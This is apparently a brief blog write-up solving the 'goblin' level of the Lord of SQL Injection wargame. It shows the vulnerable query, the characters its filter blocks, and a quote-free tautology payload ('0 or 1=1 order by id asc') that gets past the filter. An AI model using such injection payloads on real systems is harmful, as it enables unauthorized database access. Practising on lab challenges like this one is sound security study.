---
title: "[LOS] goblin"
date: 2025-03-21 00:00:00
categories: [Wargame, Lord of SQL Injection]
tags: [webhacking, sqli]
published: True
---

# Query

```sql
select id from prob_goblin where id='guest' and no={$_GET[no]}
```

<br>

# preg_match

- `prob` 문자열
- `_`
- `.`
- `()`

- `'`
- `"`
- \`


<br>

# Payload

```
?no=0 or 1=1 order by id asc
```
